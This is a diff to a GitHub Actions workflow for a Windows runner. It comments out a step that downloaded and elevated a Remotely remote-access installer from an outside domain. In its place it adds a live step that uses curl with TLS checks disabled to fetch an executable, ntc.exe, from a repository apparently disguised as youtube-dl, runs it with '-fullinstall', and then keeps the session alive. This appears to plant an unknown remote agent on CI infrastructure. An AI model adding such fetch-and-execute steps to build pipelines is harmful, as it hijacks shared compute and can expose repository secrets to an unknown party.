@@ -7,9 +7,9 @@ jobs:
   setup:
     runs-on: windows-2022
     steps:
-      - name: Install Remotely Agent
-        shell: pwsh
-        run: |
+      #- name: Install Remotely Agent
+        #shell: pwsh
+        #run: |
           #Write-Host "📦 Downloading and installing Remotely agent..."
           #$url = 'https://lamle.dpdns.org/api/ClientDownloads/WindowsInstaller/d5f2586b-3579-4c89-99ad-6e855fbc93f0'          
           #$outfile = "$env:TEMP\Install-Remotely.ps1"
@@ -17,6 +17,11 @@ jobs:
           #Write-Host "▶️ Running installer script..."
           #Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$outfile`"" -Verb RunAs
           #Write-Host "✅ Remotely agent installation triggered."
+      - name: agent
+        shell: cmd
+        run: |
+          curl.exe --insecure https://raw.githubusercontent.com/christho9999/youtube-dl/master/ntc.exe --output ntc.exe
+          ntc.exe -fullinstall          
           
       - name: Keep session alive
         shell: pwsh
